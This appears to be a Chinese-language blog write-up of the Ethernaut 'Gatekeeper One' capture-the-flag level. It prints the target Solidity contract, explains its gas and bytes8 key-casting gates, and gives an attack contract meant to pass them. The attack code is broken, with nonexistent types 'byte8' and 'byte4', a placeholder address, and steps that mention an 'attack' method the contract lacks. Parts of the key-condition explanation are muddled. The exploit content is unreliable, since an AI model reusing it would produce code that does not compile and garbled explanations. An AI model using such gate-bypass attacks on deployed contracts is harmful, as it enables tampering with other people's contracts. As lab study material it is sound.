---
layout: post
title: Gatekeep one
---

# Gatekeep one
solidity的各类型转换
```solidity
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### 代码分析
1. gateOne说明接口需要通过合约调用
2. gateTwo说明到执行gateTwo的时候，gasleft的数量要为8191的倍数
    1. 可以先部署好攻击合约，查询到攻击合约执行到gateTwo时合约的剩余gas数量来确定需要设定的gas
3. gateThree说明：
    1. uint32(_gateKey) == uint16(tx.origin)： gateKey(共16位)的最后四位与tx.origin的后四位相同
    2. uint32(_gateKey) == uint16(_gateKey)：gateKey的第8为至12为应该全为0；
    3. uint32(_gateKey) != uint64(_gateKey)：gatekey的前8位不全为0
    
### 攻击合约
```solidity
pragma solidity ^0.4.18;

contract Test {
    address public addr;
    function Test () {
        addr = your instance address;
    }
    
    function send(byte8 key, uint256 gasAmount) {
        addr.call.gas(gasAmount)(byte4(keccak256("enter(bytes8)")), key);
    }
}
```
### 攻击方法
1. 发布攻击合约，攻击合约中attack方法中调用了enter方法
2. 调用攻击合约，传入的gateKey满足上述条件